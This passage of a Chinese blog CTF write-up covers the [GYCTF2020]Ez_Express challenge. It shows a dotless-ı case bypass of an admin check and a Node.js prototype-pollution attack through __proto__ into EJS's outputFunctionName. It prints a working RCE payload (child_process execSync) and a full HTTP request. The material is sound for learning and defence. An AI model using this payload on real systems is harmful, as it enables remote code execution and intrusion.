class="string">'/'</span>); </span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span>(req.<span class="property">body</span>.<span class="property">Submit</span>==<span class="string">"login"</span>){</span><br><span class="line">    <span class="keyword">if</span>(!req.<span class="property">session</span>.<span class="property">user</span>){res.<span class="title function_">end</span>(<span class="string">"&lt;script&gt;alert('register first');history.go(-1);&lt;/script&gt;"</span>)}</span><br><span class="line">    <span class="keyword">if</span>(req.<span class="property">session</span>.<span class="property">user</span>.<span class="property">user</span>==req.<span class="property">body</span>.<span class="property">userid</span>&amp;&amp;req.<span class="property">body</span>.<span class="property">pwd</span>==req.<span class="property">session</span>.<span class="property">user</span>.<span class="property">passwd</span>){</span><br><span class="line">      req.<span class="property">session</span>.<span class="property">user</span>.<span class="property">isLogin</span>=<span class="literal">true</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">else</span>{</span><br><span class="line">      res.<span class="title function_">end</span>(<span class="string">"&lt;script&gt;alert('error passwd');history.go(-1);&lt;/script&gt;"</span>)</span><br><span class="line">    }</span><br><span class="line">  </span><br><span class="line">  }</span><br><span class="line">  res.<span class="title function_">redirect</span>(<span class="string">'/'</span>); ;</span><br><span class="line">});</span><br><span class="line">router.<span class="title function_">post</span>(<span class="string">'/action'</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) {</span><br><span class="line">  <span class="keyword">if</span>(req.<span class="property">session</span>.<span class="property">user</span>.<span class="property">user</span>!=<span class="string">"ADMIN"</span>){res.<span class="title function_">end</span>(<span class="string">"&lt;script&gt;alert('ADMIN is asked');history.go(-1);&lt;/script&gt;"</span>)} </span><br><span class="line">  req.<span class="property">session</span>.<span class="property">user</span>.<span class="property">data</span> = <span class="title function_">clone</span>(req.<span class="property">body</span>);</span><br><span class="line">  res.<span class="title function_">end</span>(<span class="string">"&lt;script&gt;alert('success');history.go(-1);&lt;/script&gt;"</span>);  </span><br><span class="line">});</span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">'/info'</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) {</span><br><span class="line">  res.<span class="title function_">render</span>(<span class="string">'index'</span>,data={<span class="string">'user'</span>:res.<span class="property">outputFunctionName</span>});</span><br><span class="line">})</span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = router;</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
+
+<p>看下面两段代码</p>
+<figure class="highlight javascript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">safeKeyword</span>(<span class="params">keyword</span>) {</span><br><span class="line">  <span class="keyword">if</span>(keyword.<span class="title function_">match</span>(<span class="regexp">/(admin)/i</span>s)) {</span><br><span class="line">      <span class="keyword">return</span> keyword</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="literal">undefined</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+
+<figure class="highlight javascript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">router.<span class="title function_">post</span>(<span class="string">'/login'</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) {</span><br><span class="line">  <span class="keyword">if</span>(req.<span class="property">body</span>.<span class="property">Submit</span>==<span class="string">"register"</span>){</span><br><span class="line">   <span class="keyword">if</span>(<span class="title function_">safeKeyword</span>(req.<span class="property">body</span>.<span class="property">userid</span>)){</span><br><span class="line">    res.<span class="title function_">end</span>(<span class="string">"&lt;script&gt;alert('forbid word');history.go(-1);&lt;/script&gt;"</span>) </span><br><span class="line">   }</span><br><span class="line">    req.<span class="property">session</span>.<span class="property">user</span>={</span><br><span class="line">      <span class="string">'user'</span>:req.<span class="property">body</span>.<span class="property">userid</span>.<span class="title function_">toUpperCase</span>(),</span><br><span class="line">      <span class="string">'passwd'</span>: req.<span class="property">body</span>.<span class="property">pwd</span>,</span><br><span class="line">      <span class="string">'isLogin'</span>:<span class="literal">false</span></span><br><span class="line">    }</span><br><span class="line">    res.<span class="title function_">redirect</span>(<span class="string">'/'</span>); </span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span>(req.<span class="property">body</span>.<span class="property">Submit</span>==<span class="string">"login"</span>){</span><br><span class="line">    <span class="keyword">if</span>(!req.<span class="property">session</span>.<span class="property">user</span>){res.<span class="title function_">end</span>(<span class="string">"&lt;script&gt;alert('register first');history.go(-1);&lt;/script&gt;"</span>)}</span><br><span class="line">    <span class="keyword">if</span>(req.<span class="property">session</span>.<span class="property">user</span>.<span class="property">user</span>==req.<span class="property">body</span>.<span class="property">userid</span>&amp;&amp;req.<span class="property">body</span>.<span class="property">pwd</span>==req.<span class="property">session</span>.<span class="property">user</span>.<span class="property">passwd</span>){</span><br><span class="line">      req.<span class="property">session</span>.<span class="property">user</span>.<span class="property">isLogin</span>=<span class="literal">true</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">else</span>{</span><br><span class="line">      res.<span class="title function_">end</span>(<span class="string">"&lt;script&gt;alert('error passwd');history.go(-1);&lt;/script&gt;"</span>)</span><br><span class="line">    }</span><br><span class="line">  </span><br><span class="line">  }</span><br><span class="line">  res.<span class="title function_">redirect</span>(<span class="string">'/'</span>); ;</span><br><span class="line">});</span><br></pre></td></tr></tbody></table></figure>
+
+<p>只有用admin登录才会return keyword 否则返回undefined 返回undefined就会弹窗forbid word 如果username经过toUpperCase后不能与原来的匹配 或password错误 就会弹窗error passwd 这也是为什么题中说用户名只支持大写</p>
+<p>再看这段 就很恶心 如果username为ADMIN就不能登录 又不让用admin 又得用admin登录 这里就用到了JavaScript大小写的漏洞</p>
+<p>原理移步p神博客 <a class="link" target="_blank" rel="noopener" href="https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html">Fuzz中的javascript大小写特性 | 离别歌 (leavesongs.com)<i class="fas fa-external-link-alt"></i></a></p>
+<figure class="highlight javascript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(req.<span class="property">session</span>.<span class="property">user</span>.<span class="property">user</span>!=<span class="string">"ADMIN"</span>){res.<span class="title function_">end</span>(<span class="string">"&lt;script&gt;alert('ADMIN is asked');history.go(-1);&lt;/script&gt;"</span>)} </span><br></pre></td></tr></tbody></table></figure>
+
+<p>所以用<code>ADMıN</code>来绕过 注意不是ADMiN 中间那个i是一个奇怪的字符 把username输入ADMıN直接注册就可以了（题目环境怪怪的 有的时候ADMıN 不行就试试admın）登录进去还给了flag的位置</p>
+<p><img lazyload="" alt="image" data-src="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202208032133466.png"></p>
+<p><img lazyload="" alt="image" data-src="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202208032137738.png"></p>
+<p>这里试了试没啥用 继续看源码 上面提到了 merge clone操作可以控制键值和键名 从而达到污染</p>
+<figure class="highlight javascript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">merge</span> = (<span class="params">a, b</span>) =&gt; {</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> attr <span class="keyword">in</span> b) {</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_">isObject</span>(a[attr]) &amp;&amp; <span class="title function_">isObject</span>(b[attr])) {</span><br><span class="line">      <span class="title function_">merge</span>(a[attr], b[attr]);</span><br><span class="line">    } <span class="keyword">else</span> {</span><br><span class="line">      a[attr] = b[attr];</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">return</span> a</span><br><span class="line">}<span class="keyword">const</span> <span class="title function_">merge</span> = (<span class="params">a, b</span>) =&gt; {</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> attr <span class="keyword">in</span> b) {</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_">isObject</span>(a[attr]) &amp;&amp; <span class="title function_">isObject</span>(b[attr])) {</span><br><span class="line">      <span class="title function_">merge</span>(a[attr], b[attr]);</span><br><span class="line">    } <span class="keyword">else</span> {</span><br><span class="line">      a[attr] = b[attr];</span><br><span class="line">    }</span><br><span class="line">  }</span><br></pre></td></tr></tbody></table></figure>
+
+<p>往下看找到调用clone的位置</p>
+<figure class="highlight javascript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">router.<span class="title function_">post</span>(<span class="string">'/action'</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) {</span><br><span class="line">  <span class="keyword">if</span>(req.<span class="property">session</span>.<span class="property">user</span>.<span class="property">user</span>!=<span class="string">"ADMIN"</span>){res.<span class="title function_">end</span>(<span class="string">"&lt;script&gt;alert('ADMIN is asked');history.go(-1);&lt;/script&gt;"</span>)} </span><br><span class="line">  req.<span class="property">session</span>.<span class="property">user</span>.<span class="property">data</span> = <span class="title function_">clone</span>(req.<span class="property">body</span>);</span><br><span class="line">  res.<span class="title function_">end</span>(<span class="string">"&lt;script&gt;alert('success');history.go(-1);&lt;/script&gt;"</span>);  </span><br><span class="line">});</span><br></pre></td></tr></tbody></table></figure>
+
+<p>也就是说我们可以在action路由下通过请求体来进行污染 原型链污染的位置找到了 接下来就是要找到可以用来控制键名和键值的对象</p>
+<p>看到这段</p>
+<figure class="highlight javascript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">router.<span class="title function_">get</span>(<span class="string">'/info'</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) {</span><br><span class="line">  res.<span class="title function_">render</span>(<span class="string">'index'</span>,data={<span class="string">'user'</span>:res.<span class="property">outputFunctionName</span>});</span><br><span class="line">})</span><br></pre></td></tr></tbody></table></figure>
+
+<p>render函数应该不陌生 在模板注入攻击（SSTI）中很常见  这里将回显req的outputFunctionNmae渲染到了index中 那么我们是不是可以利用outputFunctionName进行SSTI从而达到rce呢 代码跟下来我们发现并没有outputFunctionName这个东西 也就是说它是我们可以用来污染原型链的载体 如果把Object的prototype中加上键名为outputFunctionName 键值为恶意payload的属性 那么在进行模板渲染时 是不是就会执行我们的恶意payload</p>
+<p>但是我们考虑一个问题 如何去修改Object的prototype （确实是可以的 但是有点麻烦 下面参考文章的最后一篇就是直接修改Object的prototypr）我们重新回到这段代码</p>
+<figure class="highlight javascript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">router.<span class="title function_">post</span>(<span class="string">'/action'</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) {</span><br><span class="line">  <span class="keyword">if</span>(req.<span class="property">session</span>.<span class="property">user</span>.<span class="property">user</span>!=<span class="string">"ADMIN"</span>){res.<span class="title function_">end</span>(<span class="string">"&lt;script&gt;alert('ADMIN is asked');history.go(-1);&lt;/script&gt;"</span>)} </span><br><span class="line">  req.<span class="property">session</span>.<span class="property">user</span>.<span class="property">data</span> = <span class="title function_">clone</span>(req.<span class="property">body</span>);</span><br><span class="line">  res.<span class="title function_">end</span>(<span class="string">"&lt;script&gt;alert('success');history.go(-1);&lt;/script&gt;"</span>);  </span><br><span class="line">});</span><br></pre></td></tr></tbody></table></figure>
+
+<p>发现请求体被clone到了req.session.user.data中 对于req.session.user这个对象来说 它的<code>__proto__</code>属性是不是就是Object的prototype 所以我们可以修改了这个对象的<code>__proto__</code>从而达到目的</p>
+<figure class="highlight javascript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">req.<span class="property">session</span>.<span class="property">user</span>={</span><br><span class="line">      <span class="string">'user'</span>:req.<span class="property">body</span>.<span class="property">userid</span>.<span class="title function_">toUpperCase</span>(),</span><br><span class="line">      <span class="string">'passwd'</span>: req.<span class="property">body</span>.<span class="property">pwd</span>,</span><br><span class="line">      <span class="string">'isLogin'</span>:<span class="literal">false</span></span><br><span class="line">    }</span><br></pre></td></tr></tbody></table></figure>
+
+<p>SSTI的payload我也不是很懂 反正原理都是不断调用原型对象 最后找到一个可以用来rce的函数 payload和<code>CVE-2019-10744</code>是一样的 直接搬来用了</p>
+<figure class="highlight javascript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">{<span class="string">"__proto__"</span>:{<span class="string">"outputFunctionName"</span>:<span class="string">"a=1;return global.process.mainModule.constructor._load('child_process').execSync('cat /flag');//"</span>}}</span><br></pre></td></tr></tbody></table></figure>
+
+<p>污染成功后在info路由下调用res.outputFunctionName时 就像上面调用<code>son.last_name</code>的过程一样 最终调用到了Object的outputFunctionName 并且要让<code>__proto__</code>为键名 要用JSON格式 所以要用burp拦包添加content type（在进行POST传参时必须有该头） 放个包做个参考 记得路由和传参方式也要改 再传payload</p>
+<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST /action HTTP/1.1</span><br><span class="line">Host: 8f9161b2-5acd-465d-8854-969004e758fb.node4.buuoj.cn:81</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Referer: http://8f9161b2-5acd-465d-8854-969004e758fb.node4.buuoj.cn:81/login</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: session=s%3A1jilnCKBesMA5qC1gPlt6SPb18ntn7h7.4wyQ3TbDJtVXUhdOdErxMFKs6EcCnNrCkeUjRFYK3MY</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 137</span><br><span class="line"></span><br><span class="line">{"__proto__":{"outputFunctionName":"a=1;return global.process.mainModule.constructor._load('child_process').execSync('cat /flag');//"}}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
+
+<p>在action路由下污染成功后应该接着访问info路由进行SSTI 但是不知道为啥我包发过去直接给flag了 </p>
+<p><img lazyload="" alt="image" data-src="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202208032216423.png"></p>
+<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a class="link" target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html#0x02-javascript">深入理解 JavaScript Prototype 污染攻击 | 离别歌 (leavesongs.com)<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link" target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1ci4y157Ci?p=1&amp;vd_source=ce28d3130b8ba56f85e090c857c00132">【全网首发:已完结】快速搞懂『原型、原型链』【JavaScript基础专题】_哔哩哔哩_bilibili<i class="fas fa-external-link-alt"></i></a></p>
+<p> <a class="link" target="_blank" rel="noopener" href="https://blog.csdn.net/qq_54929891/article/details/124556857?spm=1001.2101.3001.6650.1&amp;utm_medium=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~default-1-124556857-blog-125721365.pc_relevant_multi_platform_featuressortv2removedup&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~default-1-124556857-blog-125721365.pc_relevant_multi_platform_featuressortv2removedup&amp;utm_relevant_index=2">GYCTF2020]Ez_Express 原型链污染_-栀蓝-的博客-CSDN博客<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link" target="_blank" rel="noopener" href="https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html">Fuzz中的javascript大小写特性 | 离别歌 (leavesongs.com)<i class="fas fa-external-link-alt"></i></a></p>
+<p> <a class="link" target="_blank" rel="noopener" href="https://blog.csdn.net/DARKNOTES/article/details/124000520">Web/Nodejs]原型链污染EJS模块的利用分析(附源码分析)_車鈊的博客-CSDN博客<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link" target="_blank" rel="noopener" href="https://xz.aliyun.com/t/6113#toc-4">https://xz.aliyun.com/t/6113#toc-4<i class="fas fa-external-link-alt"></i></a></p>
+
+            </div>
+
+            
+
+            
+                <ul class="post-tags-box">
+                    
+                        <li class="tag-item">
+                            <a href="/tags/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/">#原型链污染</a>&nbsp;
+                        </li>
+                    
+                </ul>
+            
+
+            
+                <div class="article-nav">
+                    
+                        <div class="article-prev">
+                            <a class="prev"
+                               rel="prev"
+                               href="/2023/04/21/Java%E5%AE%89%E5%85%A8%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%A2%84%E5%A4%87%E5%85%A8%E7%9F%A5/"
+                            >
+                            <span class="left arrow-icon flex-center">
+                              <i class="fas fa-chevron-left"></i>
+                            </span>
+                                <span class="title flex-center">
+                                <span class="post-nav-title-item">Java安全反序列化预备全知</span>
+                                <span class="post-nav-item">上一篇</span>
+                            </span>
+                            </a>
+                        </div>
+                    
+                    
+                        <div class="article-next">
+                            <a class="next"
+                               rel="next"
+                               href="/2023/04/20/VM%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/"
+                            >
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">VM沙箱逃逸</span>
+                                <span class="post-nav-item">下一篇</span>
+                            </span>
+                                <span class="right arrow-icon flex-center">
+                              <i class="fas fa-chevron-right"></i>
+                            </span>
+                            </a>
+                        </div>
+                    
+                </div>
+            
+
+            
+                <div class="comment-container">
+                    
+<div class="comments-container">
+    <div id="comments-anchor"></div>
+    <div class="comment-area-title">
+        <i class="fas fa-comments"></i>&nbsp;评论
+    </div>
+    
+        
+            
+
+    <div class="valine-container">
+        <script data-pjax src="//cdn.jsdelivr.net/npm/valine@latest/dist/Valine.min.js"></script>
+        <div id="vcomments"></div>
+        <script data-pjax>
+          function loadValine() {
+
+            const config = {
+              el: '#vcomments',
+              appId: 'yCemvr5nGXrJlWRCN3SLWLLy-MdYXbMMI',
+              appKey: '7gIuYJ9YQk94en6wRudankYd',
+              meta: ['nick', 'mail', 'link'],
+              avatar: 'wavatar',
+              enableQQ: true,
+              placeholder: 'Hi speak something！',
+              lang: 'zh-CN'.toLowerCase()
+            }
+
+            if ('https://ycemvr5n.api.lncldglobal.com') {
+              config.serverURLs = 'https://ycemvr5n.api.lncldglobal.com'
+            }
+
+            new Valine(config)
+
+            function getAuthor(language) {
+              switch (language) {
+                case 'en':
+                  return 'Author'
+                case 'zh-CN':
+                  return '博主'
+                default:
+                  return 'Master'
+              }
+            }
+
+            // Add "Author" identify
+            const getValineDomTimer = setInterval(() => {
+              const vcards = document.querySelectorAll('#vcomments .vcards .vcard')
+              if (vcards.length > 0) {
+                let author = 'y1zh3e7'
+
+                if (author) {
+                  for (let vcard of vcards) {
+                    const vnick_dom = vcard.querySelector('.vhead .vnick')
+                    const vnick = vnick_dom.innerHTML
+                    if (vnick === author) {
+                      vnick_dom.innerHTML = `${vnick} <span class="author">${getAuthor(KEEP.hexo_config.language)}</span>`
+                    }
+                  }
+                }
+                clearInterval(getValineDomTimer)
+              } else {
+                clearInterval(getValineDomTimer)
+              }
+            }, 2000)
+          }
+
+          if ('true' === 'true') {
+            const loadValineTimeout = setTimeout(() => {
+              loadValine()
+              clearTimeout(loadValineTimeout)
+            }, 1000)
+          } else {
+            window.addEventListener('DOMContentLoaded', loadValine)
+          }
+        </script>
+    </div>
+
+
+
+        
+    
+</div>
+
+                </div>
+            
+        </div>
+
+        
+            <div class="toc-content-container">
+                <div class="post-toc-wrap">
+    <div class="post-toc">
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93"><span class="nav-text">Nodejs原型链污染</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Nodejs%E4%B8%8EJavaScript%E5%92%8CJSON"><span class="nav-text">Nodejs与JavaScript和JSON</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8E%9F%E5%9E%8B%E5%AF%B9%E8%B1%A1%EF%BC%88prototype%EF%BC%89%E4%B8%8E%E5%8E%9F%E5%9E%8B%E8%BF%9E%E6%8E%A5%E7%82%B9%EF%BC%88-proto-%EF%BC%89%E4%B8%8E%E5%8E%9F%E5%9E%8B%E9%93%BE"><span class="nav-text">原型对象（prototype）与原型连接点（__proto__）与原型链</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93"><span class="nav-text">原型链污染</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="nav-text">漏洞复现</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#GYCTF2020-Ez-Express"><span class="nav-text">[GYCTF2020]Ez_Express</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="nav-text">参考文章</span></a></li></ol></li></ol>
+    </div>
+</div>
+
+            </div>
+        
+    </div>
+</div>
+
+
+                
+            </div>
+
+        </div>
+
+        <div class="page-main-content-bottom">
+            
+<footer class="footer">
+    <div class="info-container">
+        <div class="copyright-info info-item">
+            &copy;
+            
+                <span>2023</span> -
+            
+            2023
+            
+                &nbsp;<i class="fas fa-heart icon-animate"></i>
+                &nbsp;<a href="/">y1zh3e7</a>
+            
+        </div>
+        
+            <script async data-pjax
+                    src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="website-count info-item">
+                
+                    访问人数&nbsp;<span id="busuanzi_value_site_uv"></span>&ensp;
+                
+                
+                    总访问量&nbsp;<span id="busuanzi_value_site_pv"></span>
+                
+            </div>
+        
+        <div class="theme-info info-item">
+            由 <a target="_blank" href="https://hexo.io">Hexo</a> 驱动&nbsp;|&nbsp;主题&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.6.1</a>
+        </div>
+        
+        
+    </div>
+</footer>
+
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="tools-item flex-center toggle-show-toc">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+            <li class="tools-item flex-center go-to-comments">
+                <i class="fas fa-comment"></i>
+                <span class="post-comments-count"></span>
+            </li>
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-bottom-side-tools">
+        <div class="side-tools-container">
+    <ul class="side-tools-list">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <li class="tools-item tool-dark-light-toggle flex-center">
+            <i class="fas fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list">
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+        
+            <li class="tools-item tool-scroll-to-top flex-center">
+                <i class="arrow-up fas fa-arrow-up"></i>
+                <span class="percent"></span>
+            </li>
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="zoom-in-image-mask">
+    <img class="zoom-in-image">
+</div>
+
+
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fas fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="搜索..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="close-popup-btn">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+</main>
+
+
+
+<script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/utils.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/main.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/header-shrink.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/back2top.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/dark-light-toggle.js"></script>
+
+
+
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/local-search.js"></script>
+
+
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/code-block.js"></script>
+
+
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/lazyload.js"></script>
+
+
+<div class="post-scripts pjax">
+    
+        <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/post-helper.js"></script>
+        
+            <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/libs/anime.min.js"></script>
+        
+        
+            <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/toc.js"></script>
+        
+    
+</div>
+
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/libs/pjax.min.js"></script>
+<script>
+    window.addEventListener('DOMContentLoaded', () => {
+        window.pjax = new Pjax({
+            selectors: [
+                'head title',
+                '.page-container',
+                '.pjax'
+            ],
+            history: true,
+            debug: false,
+            cacheBust: false,
+            timeout: 0,
+            analytics: false,
+            currentUrlFullReload: false,
+            scrollRestoration: false,
+            // scrollTo: true,
+        });
+
+        document.addEventListener('pjax:send', () => {
+            KEEP.utils.pjaxProgressBarStart();
+        });
+
+        document.addEventListener('pjax:complete', () => {
+            KEEP.utils.pjaxProgressBarEnd();
+            window.pjax.executeScripts(document.querySelectorAll('script[data-pjax], .pjax script'));
+            KEEP.refresh();
+        });
+    });
+</script>
+
+
+
+</body>
+</html>
